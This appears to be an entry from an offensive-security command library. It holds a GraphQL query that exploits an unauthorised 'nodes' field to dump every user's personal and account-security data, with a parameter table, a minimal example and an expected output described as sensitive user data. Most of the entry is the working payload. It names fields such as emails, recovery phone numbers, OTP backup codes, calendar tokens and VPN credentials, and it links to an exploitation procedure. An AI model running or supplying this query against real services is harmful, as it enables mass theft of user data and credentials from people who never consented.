---
data: |-
  {
    id
    users()
    {
      total_count
      nodes
      {
        _id
        name
        username
        email
        account_recovery_phone_number
        account_recovery_unverified_phone_number
        bounties
        {
          total_amount
        }
        otp_backup_codes
        i_can_update_username
        location
        year_in_review_published_at
        anc_triager
        blacklisted_from_hacker_publish
        calendar_token
        vpn_credentials
        {
          name
        }
        account_recovery_phone_number_sent_at
        account_recovery_phone_number_verified_at
        swag
        {
          total_count
        }
        totp_enabled
        subscribed_for_team_messages
        subscribed_for_monthly_digest
        sessions
        {
          total_count
        }
        facebook_user_id
        unconfirmed_email
      }
    }
  }
tags:
  - graphql
  - data-leak
type: command
executor: graphql
platforms:
  - Web
id: 7a22f8b6-a61a-4d98-b4f8-b1b4e0c019b8
created_at: '2025-12-11T06:10:40.204Z'
updated_at: '2025-12-11T06:10:40.204Z'
verified: false
validated: true
submitted: true
---
# graphql-user-data-leak-query

## Command

```graphql
{
  id
  users()
  {
    total_count
    nodes
    {
      _id
      name
      username
      email
      account_recovery_phone_number
      account_recovery_unverified_phone_number
      bounties
      {
        total_amount
      }
      otp_backup_codes
      i_can_update_username
      location
      year_in_review_published_at
      anc_triager
      blacklisted_from_hacker_publish
      calendar_token
      vpn_credentials
      {
        name
      }
      account_recovery_phone_number_sent_at
      account_recovery_phone_number_verified_at
      swag
      {
        total_count
      }
      totp_enabled
      subscribed_for_team_messages
      subscribed_for_monthly_digest
      sessions
      {
        total_count
      }
      facebook_user_id
      unconfirmed_email
    }
  }
}
```

## Description

GraphQL query to fetch sensitive user information via 'nodes' field, demonstrating the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `users()` | Connection to query all users | Yes |
| `nodes` | Field to retrieve user nodes without authorization | Yes |
| `email` | User email | No |
| `otp_backup_codes` | Hashed OTP backup codes | No |

## Examples

### Basic Usage

```graphql
{
  id
  users() {
    nodes {
      email
    }
  }
}
```

## Expected Output

Sensitive user data including emails, phone numbers, etc.

## Related

- [[commands/graphql-vulnerable-query-nodes]]
- [[procedures/Exploit-GraphQL-Nodes-Field-for-User-Data-Leakage]]
